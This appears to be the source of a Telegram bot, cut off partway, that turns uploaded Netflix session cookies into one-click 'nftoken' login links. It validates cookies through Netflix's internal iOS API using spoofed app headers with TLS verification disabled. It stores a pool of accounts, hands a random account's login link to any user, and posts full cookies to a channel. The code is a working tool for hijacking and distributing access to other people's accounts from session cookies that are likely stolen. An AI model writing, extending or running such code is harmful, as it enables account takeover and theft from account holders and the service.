import os
import json
import re
import random
import urllib.parse
from datetime import datetime
import telebot
import requests
import time
import sys
import traceback
import logging
from telebot import apihelper
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from typing import Dict, List, Optional, Tuple, Any, Union

# ============================================
# DISABLE SSL WARNINGS
# ============================================
import warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

# ============================================
# RAILWAY/TERMUX CONFIG
# ============================================
apihelper.READ_TIMEOUT = 120
apihelper.CONNECT_TIMEOUT = 120

# ============================================
# ENVIRONMENT VARIABLES
# ============================================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not BOT_TOKEN:
    print("❌ TELEGRAM_TOKEN not found!")
    exit(1)

CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1003937881669")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8741623856"))
WATERMARK = os.environ.get("WATERMARK", "github.com/harshitkamboj")
MAX_RETRIES = int(os.environ.get("MAX_RETRIES", "3"))
RETRY_DELAY = int(os.environ.get("RETRY_DELAY", "10"))
PROCESS_INTERVAL = int(os.environ.get("PROCESS_INTERVAL", "20"))
RATE_LIMIT = int(os.environ.get("RATE_LIMIT", "30"))

# ============================================
# FILE PATHS
# ============================================
COOKIE_FILE = "cookies.json"
USERS_FILE = "users.json"
PROCESSING_FILE = "processing.json"
BACKUP_FILE = "backup.json"
LOG_DIR = "logs"
BOT_LOG_FILE = os.path.join(LOG_DIR, "bot.log")
ERROR_LOG_FILE = os.path.join(LOG_DIR, "errors.log")

# ============================================
# LOGGING SETUP
# ============================================
os.makedirs(LOG_DIR, exist_ok=True)

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(BOT_LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

# Error logger
error_logger = logging.getLogger('error_logger')
error_handler = logging.FileHandler(ERROR_LOG_FILE, encoding='utf-8')
error_handler.setLevel(logging.ERROR)
error_logger.addHandler(error_handler)

# ============================================
# JSON FUNCTIONS
# ============================================
def load_json(file_name: str, default: Any = {}) -> Any:
    """Load JSON file with error handling"""
    if os.path.exists(file_name):
        try:
            with open(file_name, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load {file_name}: {e}")
            error_logger.error(f"Failed to load {file_name}: {e}")
            return default
    return default

def save_json(file_name: str, data: Any) -> bool:
    """Save JSON file with error handling"""
    try:
        with open(file_name, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error(f"Failed to save {file_name}: {e}")
        error_logger.error(f"Failed to save {file_name}: {e}")
        return False

def log_message(msg: str) -> None:
    """Log message with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")
    logger.info(msg)

def load_cookies() -> Dict:
    """Load cookies from file"""
    return load_json(COOKIE_FILE, {})

def save_cookies(cookies: Dict) -> bool:
    """Save cookies to file"""
    return save_json(COOKIE_FILE, cookies)

def add_user(user_id: int, username: str) -> bool:
    """Add or update user in database"""
    try:
        users = load_json(USERS_FILE, {})
        user_id_str = str(user_id)
        
        if user_id_str not in users:
            users[user_id_str] = {
                "username": username,
                "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "tokens_generated": 0,
                "total_uploads": 0
            }
        else:
            users[user_id_str]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            users[user_id_str]["tokens_generated"] = users[user_id_str].get("tokens_generated", 0) + 1
        
        return save_json(USERS_FILE, users)
    except Exception as e:
        logger.error(f"Failed to add user: {e}")
        error_logger.error(f"Failed to add user: {e}")
        return False

def update_processing_status(status: Dict) -> bool:
    """Update processing status"""
    try:
        return save_json(PROCESSING_FILE, status)
    except Exception as e:
        logger.error(f"Failed to update processing status: {e}")
        error_logger.error(f"Failed to update processing status: {e}")
        return False

def get_processing_status() -> Dict:
    """Get processing status"""
    return load_json(PROCESSING_FILE, {"is_processing": False, "current": 0, "total": 0, "last_account": ""})

def create_backup() -> bool:
    """Create backup of all data"""
    try:
        backup_data = {
            "cookies": load_cookies(),
            "users": load_json(USERS_FILE, {}),
            "processing": get_processing_status(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        return save_json(BACKUP_FILE, backup_data)
    except Exception as e:
        logger.error(f"Failed to create backup: {e}")
        error_logger.error(f"Failed to create backup: {e}")
        return False

# ============================================
# SHAYARI LIST
# ============================================
SHAYARI_LIST = [
    "💫 Har mod pe milenge naye bahane,\nZindagi ke safar mein hain afsane,\nHum to chalte rahenge apni raah par,\nTum bhi muskurakar dikhao zamane.",
    "🌙 Chand ki chandni jaise khilti hai,\nHar sham nai ummid le kar aati hai,\nHumne to har din ek kahani likhi,\nTum apni kismat khud banati hai.",
    "💖 Dilon ke milne ki dastaan hai,\nHar pal mein teri pehchan hai,\nJo sachcha ho use manzil milti hai,\nBas ek nazar mohabbat ka farman hai.",
    "✨ Raatein bhi hain aur sitare bhi,\nTeri yaadon ke sahare bhi,\nHum to bas ek sapna dekhte hain,\nJismein ho teri baatein har baar bhi.",
    "🌺 Jo samandar se gehra hai,\nHar ada mein jadoo bhara hai,\nMohabbat ka har rang naya hai,\nHar ek sham tumhari kahani hai.",
    "🌟 Zindagi ek safar hai, manzil hai mohabbat,\nHar ek mod pe milti hai nayi raahat,\nJo chale saath tere, wohi hai apna,\nBaki toh bas ek khwab hai sapna.",
    "💫 Dil ki baatein alfazon mein kehna mushkil hai,\nHar ek lamha teri yaad mein hai,\nTum ho toh har gham se hai raahat,\nTum nahi toh kuch bhi nahi hai.",
    "🌹 Mohabbat ka har rang naya hai,\nHar ek sham tumhari kahani hai,\nHumne toh bas tumhe hi dekha hai,\nBaki duniya toh ek fasana hai."
]

# ============================================
# NETFLIX API CONFIG
# ============================================
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============================================
# INITIALIZE BOT
# ============================================
bot = telebot.TeleBot(BOT_TOKEN)

# ============================================
# COOKIE PARSING FUNCTIONS
# ============================================
def parse_netscape_cookie_line(line: str) -> Dict:
    """Parse netscape cookie format line"""
    line = line.strip()
    if not line or line.startswith("#"):
        return {}
    
    if "\t" in line:
        parts = line.split("\t")
    else:
        parts = re.split(r'\s+', line)
    
    if len(parts) >= 7:
        return {parts[-2]: parts[-1]}
    return {}

def _decode_cookie_value(value: str) -> str:
    """Decode URL-encoded cookie value"""
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def extract_cookie_dict(text: str) -> Dict:
    """Extract cookie dictionary from text"""
    cookie_dict = {}
    
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("="):
            continue
        if ".netflix.com" in line:
            cookie_dict.update(parse_netscape_cookie_line(line))
    
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            for key in COOKIE_KEYS:
                if key in data:
                    cookie_dict[key] = _decode_cookie_value(data[key])
    except:
        pass
    
    for key in COOKIE_KEYS:
        if key not in cookie_dict:
            match = re.search(rf"{re.escape(key)}=([^;,\s]+)", text)
            if match:
                cookie_dict[key] = _decode_cookie_value(match.group(1))
    
    return cookie_dict

def extract_multiple_cookies(text: str) -> List[Dict]:
    """Extract multiple cookies from text file"""
    cookies_list = []
    
    # Try to find multiple cookies
    lines = text.splitlines()
    current_text = ""
    current_cookie = {}
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        # Check if this line contains NetflixId (start of new cookie)
        if "NetflixId" in line and (current_text or current_cookie):
            if current_text:
                cookie_dict = extract_cookie_dict(current_text)
                if cookie_dict and cookie_dict.get("NetflixId"):
                    cookies_list.append(cookie_dict)
            current_text = line + "\n"
            current_cookie = {}
        else:
            current_text += line + "\n"
    
    # Don't forget the last cookie
    if current_text:
        cookie_dict = extract_cookie_dict(current_text)
        if cookie_dict and cookie_dict.get("NetflixId"):
            cookies_list.append(cookie_dict)
    
    # If no cookies found, try regex pattern matching
    if not cookies_list:
        netflix_patterns = re.finditer(r'NetflixId[=:][^;,\s]+', text)
        for match in netflix_patterns:
            start = max(0, match.start() - 200)
            end = min(len(text), match.end() + 200)
            cookie_text = text[start:end]
            cookie_dict = extract_cookie_dict(cookie_text)
            if cookie_dict and cookie_dict.get("NetflixId"):
                if not any(c.get("NetflixId") == cookie_dict.get("NetflixId") for c in cookies_list):
                    cookies_list.append(cookie_dict)
    
    return cookies_list

def build_nftoken_link(token: str) -> str:
    """Build NFToken link"""
    return "https://netflix.com/?nftoken=" + token

def fetch_nftoken(cookie_dict: Dict) -> Tuple[str, int]:
    """Fetch NFToken from Netflix API"""
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires

def format_expiry(expires: Union[int, float]) -> str:
    """Format expiry timestamp"""
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(expires)

def split_long_message(text: str, max_length: int = 4000) -> List[str]:
    """Split long message into smaller parts"""
    if len(text) <= max_length:
        return [text]
    
    parts = []
    current_part = ""
    
    for line in text.split('\n'):
        if len(current_part) + len(line) + 1 > max_length:
            parts.append(current_part)
            current_part = line + '\n'
        else:
            current_part += line + '\n'
    
    if current_part:
        parts.append(current_part)
    
    return parts

def send_long_message(chat_id: Union[int, str], text: str, parse_mode: str = 'HTML', 
                     reply_markup: Optional[InlineKeyboardMarkup] = None) -> bool:
    """Send long message in parts"""
    try:
        parts = split_long_message(text)
        for i, part in enumerate(parts):
            if i == len(parts) - 1:
                bot.send_message(chat_id, part, parse_mode=parse_mode, reply_markup=reply_markup)
            else:
                bot.send_message(chat_id, part, parse_mode=parse_mode)
            time.sleep(0.3)
        return True
    except Exception as e:
        logger.error(f"Failed to send long message: {e}")
        error_logger.error(f"Failed to send long message: {e}")
        try:
            bot.send_message(chat_id, text[:3500], parse_mode=parse_mode)
            return True
        except:
            return False

def save_to_channel(cookie_text: str, nftoken_link: str, expires: str, user_id: int, 
                   username: str, account_name: str = "Unknown") -> Tuple[bool, str]:
    """Save token to channel"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if len(cookie_text) > 3000:
            cookie_text = cookie_text[:3000] + "\n\n... (Cookie truncated, too long)"
        
        message = "📥 NEW NFToken Generated!\n\n"
        message += "👤 User: " + username + " (ID: " + str(user_id) + ")\n"
        message += "📂 Account: " + account_name + "\n"
        message += "⏰ Time: " + current_time + "\n\n"
        message += "🔗 NFToken Link:\n"
        message += "`" + nftoken_link + "`\n\n"
        message += "⏳ Expires: `" + expires + "`\n\n"
        message += "🍪 Complete Cookie:\n"
        message += "```\n" + cookie_text + "\n```\n\n"
        message += "---\n"
        message += "🔹 Generated by: @NetflixNFTBot\n"
        message += "🔹 " + WATERMARK
        
        send_long_message(CHANNEL_ID, message, parse_mode='Markdown')
        return True, "Sent"
    except Exception as e:
        logger.error(f"Failed to save to channel: {e}")
        error_logger.error(f"Failed to save to channel: {e}")
        return False, str(e)

def get_random_account() -> Tuple[Optional[str], Optional[str]]:
    """Get random account from cookies"""
    try:
        cookies = load_cookies()
        if not cookies:
            return None, "No accounts found! Please upload a cookie file."
        
        account_names = list(cookies.keys())
        random_account = random.choice(account_names)
        return random_account, None
    except Exception as e:
        logger.error(f"Failed to get random account: {e}")
        error_logger.error(f"Failed to get random account: {e}")
        return None, str(e)

def generate_random_token() -> Tuple[Optional[Dict], Optional[str]]:
    """Generate random NFToken"""
    try:
        account_name, error = get_random_account()
        if error:
            return None, error
        
        cookies = load_cookies()
        account = cookies.get(account_name, {})
        
        if not account:
            return None, f"Account '{account_name}' not found!"
        
        cookie_dict = {
            "NetflixId": account.get("NetflixId", "").strip(),
            "SecureNetflixId": account.get("SecureNetflixId", "").strip(),
            "nfvdid": account.get("nfvdid", "").strip()
        }
        
        if not cookie_dict["NetflixId"]:
            return None, f"❌ Account '{account_name}' has no NetflixId!"
        
        cookie_string = f"NetflixId={cookie_dict['NetflixId']}"
        if cookie_dict.get("SecureNetflixId"):
            cookie_string += f"; SecureNetflixId={cookie_dict['SecureNetflixId']}"
        if cookie_dict.get("nfvdid"):
            cookie_string += f"; nfvdid={cookie_dict['nfvdid']}"
        
        token, expires = fetch_nftoken(cookie_dict)
        nftoken_link = build_nftoken_link(token)
        expiry_str = format_expiry(expires)
        
        return {
            "token": token,
            "link": nftoken_link,
            "expires": expiry_str,
            "cookie_string": cookie_string,
            "account_name": account_name
        }, None
        
    except Exception as e:
        logger.error(f"Failed to generate token: {e}")
        error_logger.error(f"Failed to generate token: {e}")
        
        # Remove invalid cookie
        if account_name:
            invalid_cookies = load_cookies()
            if account_name in invalid_cookies:
                del invalid_cookies[account_name]
                save_cookies(invalid_cookies)
                logger.info(f"Removed invalid cookie: {account_name}")
        
        return None, f"❌ Error: {str(e)}"

def validate_cookie(cookie_dict: Dict) -> Tuple[bool, Optional[str], Optional[int]]:
    """Validate cookie"""
    try:
        token, expires = fetch_nftoken(cookie_dict)
        if token:
            return True, token, expires
        return False, None, None
    except Exception as e:
        logger.error(f"Cookie validation failed: {e}")
        error_logger.error(f"Cookie validation failed: {e}")
        return False, None, None

def get_file_size(file_path: str) -> str:
    """Get file size in human readable format"""
    try:
        size = os.path.getsize(file_path)
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size/1024:.2f} KB"
        else:
            return f"{size/(1024*1024):.2f} MB"
    except:
        return "Unknown"

def get_uptime() -> str:
    """Get bot uptime"""
    try:
        with open('/proc/uptime', 'r') as f:
            uptime_seconds = float(f.readline().split()[0])
            days = int(uptime_seconds // 86400)
            hours = int((uptime_seconds % 86400) // 3600)
            minutes = int((uptime_seconds % 3600) // 60)
            if days > 0:
                return f"{days}d {hours}h {minutes}m"
            elif hours > 0:
                return f"{hours}h {minutes}m"
            else:
                return f"{minutes}m"
    except:
        return "Unknown"

def get_memory_usage() -> str:
    """Get memory usage"""
    try:
        import psutil
        process = psutil.Process(os.getpid())
        memory_mb = process.memory_info().rss / 1024 / 1024
        return f"{memory_mb:.2f} MB"
    except:
        return "Unknown"

# ============================================
# ADMIN CHECK DECORATOR
# ============================================
def admin_only(func):
    """Decorator to restrict commands to admin only"""
    def wrapper(message):
        try:
            if message.from_user.id != ADMIN_ID:
                bot.reply_to(message, "❌ Only Admin can use this command!")
                return
            return func(message)
        except Exception as e:
            logger.error(f"Admin decorator error: {e}")
            error_logger.error(f"Admin decorator error: {e}")
            bot.reply_to(message, f"❌ Error: {str(e)}")
    return wrapper

# ============================================
# TELEGRAM COMMANDS - PUBLIC
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or "Unknown"
        add_user(user_id, username)
        logger.info(f"User started bot: {username} ({user_id})")
        
        random_shayari = random.choice(SHAYARI_LIST)
        
        text = "😵 <b>NETFLIX NF TOKEN</b> 😵\n\n"
        text += "👑 <b>Owner:</b> ❤️ 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈 ❤️\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        text += "📌 <b>Commands:</b>\n"
        text += "   🍪 /netflix - Random NFToken\n"
        text += "   📄 Send .txt file - Upload Multiple Cookies\n"
        text += "   📋 Send Cookie - Manual\n"
        text += "   📊 /stats - Bot Statistics\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        text += "✨ <b>Aaj ki Shayari:</b> ✨\n\n"
        text += random_shayari + "\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        text += "📱 <b>Contact:</b> @PawanSaini\n"
        text += "⚡ <b>Made with ❤️ by:</b> 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈"
        
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error in start command: {e}")
        error_logger.error(f"Error in start command: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['netflix'])
def show_netflix_button(message):
    """Handle /netflix command"""
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or "Unknown"
        add_user(user_id, username)
        
        cookies = load_cookies()
        if not cookies:
            bot.reply_to(message, "📭 No accounts found!\n\nUpload a .txt file to add accounts.", parse_mode='HTML')
            return
        
        markup = InlineKeyboardMarkup()
        button = InlineKeyboardButton(
            text="🌟 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 🌟",
            callback_data="netflix_random"
        )
        markup.add(button)
        
        text = "🎬 <b>Click below to get a random NFToken:</b>\n\n"
        text += f"📂 <b>Total Accounts:</b> {len(cookies)}\n\n"
        text += "✨ हर बार मिलेगा एक नया Token!"
        
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=markup)
    except Exception as e:
        logger.error(f"Error in netflix command: {e}")
        error_logger.error(f"Error in netflix command: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    """Handle callback queries"""
    try:
        if call.data == "netflix_random":
            bot.edit_message_text(
                "🎲 <b>Random Account Selected!</b>\n\n⏳ Generating NFToken...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='HTML'
            )
            
            result, error = generate_random_token()
            
            if error:
                bot.edit_message_text(
                    f"❌ <b>Error:</b> {error}",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='HTML'
                )
                bot.answer_callback_query(call.id, "Error!")
                return
            
            success_text = "✅ <b>NFToken Generated!</b> 🎉\n\n"
            success_text += f"📂 <b>Account:</b> {result['account_name']}\n"
            success_text += f"🔗 <b>Link:</b>\n<code>{result['link']}</code>\n\n"
            success_text += f"⏰ <b>Expires:</b> <code>{result['expires']}</code>\n\n"
            success_text += "📢 <b>Saved in Channel!</b>\n\n"
            success_text += "🔄 Click again for a new random token!"
            
            bot.edit_message_text(
                success_text,
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='HTML'
            )
            
            user_id = call.from_user.id
            username = call.from_user.username or call.from_user.first_name or "Unknown"
            add_user(user_id, username)
            
            save_to_channel(
                result['cookie_string'],
                result['link'],
                result['expires'],
                user_id,
                username,
                result['account_name']
            )
            bot.answer_callback_query(call.id, f"✅ Token from {result['account_name']}!")
        
        elif call.data == "cancel":
            bot.edit_message_text("❌ Cancelled!", chat_id=call.message.chat.id, message_id=call.message.message_id)
            bot.answer_callback_query(call.id, "Cancelled")
            
    except Exception as e:
        logger.error(f"Error in callback: {e}")
        error_logger.error(f"Error in callback: {e}")
        try:
            bot.answer_callback_query(call.id, "Error!")
            bot.edit_message_text(
                f"❌ Error: {str(e)}",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='HTML'
            )
        except:
            pass

# ============================================
# 📄 FILE UPLOAD - MULTI-COOKIE PROCESSING
# ============================================
@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Handle document upload (TXT file with cookies)"""
    try:
        # Check if already processing
        status = get_processing_status()
        if status.get("is_processing", False):
            bot.reply_to(message, 
                f"⏳ <b>Already processing cookies!</b>\n\n"
                f"📊 Progress: {status.get('current', 0)}/{status.get('total', 0)}\n"
                f"📌 Last: {status.get('last_account', 'None')}\n\n"
                f"Please wait until processing completes.",
                parse_mode='HTML'
            )
            return
        
        msg = bot.reply_to(message, "📄 <b>File Received! Scanning for cookies...</b>", parse_mode='HTML')
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        file_name = message.document.file_name
        
        # Extract multiple cookies
        cookies_list = extract_multiple_cookies(content)
        
        if not cookies_list:
            bot.edit_message_text(
                "❌ <b>No valid Netflix cookies found in file!</b>\n\n"
                "💡 Make sure file contains:\n"
                "• NetflixId\n"
                "• SecureNetflixId\n"
                "• nfvdid\n\n"
                "📌 Each cookie should have:\n"
                "• NetflixId=xxx; SecureNetflixId=xxx; nfvdid=xxx",
                chat_id=message.chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            return
        
        total_cookies = len(cookies_list)
        logger.info(f"File: {file_name} - Found {total_cookies} cookies")
        
        # Update processing status
        update_processing_status({
            "is_processing": True,
            "current": 0,
            "total": total_cookies,
            "last_account": "",
            "file_name": file_name,
            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        bot.edit_message_text(
            f"📄 <b>Processing {total_cookies} cookies...</b>\n\n"
            f"⏳ Each cookie will be validated and added one by one.\n"
            f"🕐 {PROCESS_INTERVAL} seconds gap between each cookie.\n\n"
            f"📌 <b>Starting...</b>",
            chat_id=message.chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        # Process cookies one by one
        valid_count = 0
        invalid_count = 0
        duplicate_count = 0
        owner_filtered = 0
        
        existing_cookies = load_cookies()
        existing_ids = {c.get("NetflixId", "") for c in existing_cookies.values()}
        
        for i, cookie_dict in enumerate(cookies_list, 1):
            status = get_processing_status()
            status["current"] = i
            update_processing_status(status)
            
            netflix_id = cookie_dict.get("NetflixId", "")
            
            # Filter: Skip Owner ID
            if netflix_id == str(ADMIN_ID) or netflix_id == "8741623856":
                owner_filtered += 1
                logger.info(f"Skipped Owner ID: {netflix_id}")
                
                try:
                    bot.edit_message_text(
                        f"📄 <b>Processing {total_cookies} cookies...</b>\n\n"
                        f"✅ Valid: {valid_count}\n"
                        f"❌ Invalid: {invalid_count}\n"
                        f"⚠️ Duplicate: {duplicate_count}\n"
                        f"🚫 Owner Filtered: {owner_filtered}\n"
                        f"⏳ Progress: {i}/{total_cookies}\n\n"
                        f"🔄 <b>Cookie {i}/{total_cookies}:</b> 🚫 OWNER ID - Skipped\n"
                        f"⏳ Waiting {PROCESS_INTERVAL} seconds...",
                        chat_id=message.chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
                
                if i < total_cookies:
                    time.sleep(PROCESS_INTERVAL)
                continue
            
            # Check for duplicate
            if netflix_id in existing_ids:
                duplicate_count += 1
                logger.info(f"Duplicate cookie found: {netflix_id[:30]}...")
                
                try:
                    bot.edit_message_text(
                        f"📄 <b>Processing {total_cookies} cookies...</b>\n\n"
                        f"✅ Valid: {valid_count}\n"
                        f"❌ Invalid: {invalid_count}\n"
                        f"⚠️ Duplicate: {duplicate_count}\n"
                        f"🚫 Owner Filtered: {owner_filtered}\n"
                        f"⏳ Progress: {i}/{total_cookies}\n\n"
                        f"🔄 <b>Cookie {i}/{total_cookies}:</b> ⚠️ DUPLICATE - Skipped\n"
                        f"⏳ Waiting {PROCESS_INTERVAL} seconds...",
                        chat_id=message.chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
                
                if i < total_cookies:
                    time.sleep(PROCESS_INTERVAL)
                continue
            
            # Validate cookie
            is_valid, token, expires = validate_cookie(cookie_dict)
            
            if not is_valid:
                invalid_count += 1
                logger.info(f"Invalid cookie: {netflix_id[:30]}...")
                
                try:
                    bot.edit_message_text(
                        f"📄 <b>Processing {total_cookies} cookies...</b>\n\n"
                        f"✅ Valid: {valid_count}\n"
                        f"❌ Invalid: {invalid_count}\n"
                        f"⚠️ Duplicate: {duplicate_count}\n"
                        f"🚫 Owner Filtered: {owner_filtered}\n"
                        f"⏳ Progress: {i}/{total_cookies}\n\n"
                        f"🔄 <b>Cookie {i}/{total_cookies}:</b> ❌ INVALID - Skipped\n"
                        f"⏳ Waiting {PROCESS_INTERVAL} seconds...",
                        chat_id=message.chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                except:
                    pass
                
                if i < total_cookies:
                    time.sleep(PROCESS_INTERVAL)
                continue
            
            # Generate account name
            account_name = file_name.replace('.txt', '').replace('.cookie', '').replace('.netscape', '')
            if not account_name:
                account_name = f"Account_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            if total_cookies > 1:
                account_name = f"{account_name}_{i}"
            
            cookies = load_cookies()
            if account_name in cookies:
                account_name = f"{account_name}_{datetime.now().strftime('%H%M%S')}"
            
            # Save valid cookie
            cookies[account_name] = {
                "NetflixId": cookie_dict.get("NetflixId", ""),
                "SecureNetflixId": cookie_dict.get("SecureNetflixId", ""),
                "nfvdid": cookie_dict.get("nfvdid", "")
            }
            save_cookies(cookies)
            existing_ids.add(netflix_id)
            valid_count += 1
            
            status = get_processing_status()
            status["last_account"] = account_name
            update_processing_status(status)
            
            logger.info(f"Added cookie: {account_name}")
            
            nftoken_link = build_nftoken_link(token)
            expiry_str = format_expiry(expires)
            
            cookie_string = f"NetflixId={cookie_dict.get('NetflixId', '')}"
            if cookie_dict.get('SecureNetflixId'):
                cookie_string += f"; SecureNetflixId={cookie_dict.get('SecureNetflixId', '')}"
            if cookie_dict.get('nfvdid'):
                cookie_string += f"; nfvdid={cookie_dict.get('nfvdid', '')}"
            
            save_to_channel(
                cookie_string,
                nftoken_link,
                expiry_str,
                message.from_user.id,
                message.from_user.username or message.from_user.first_name or "Unknown",
                account_name
            )
            
            try:
                bot.edit_message_text(
                    f"📄 <b>Processing {total_cookies} cookies...</b>\n\n"
                    f"✅ Valid: {valid_count}\n"
                    f"❌ Invalid: {invalid_count}\n"
                    f"⚠️ Duplicate: {duplicate_count}\n"
                    f"🚫 Owner Filtered: {owner_filtered}\n"
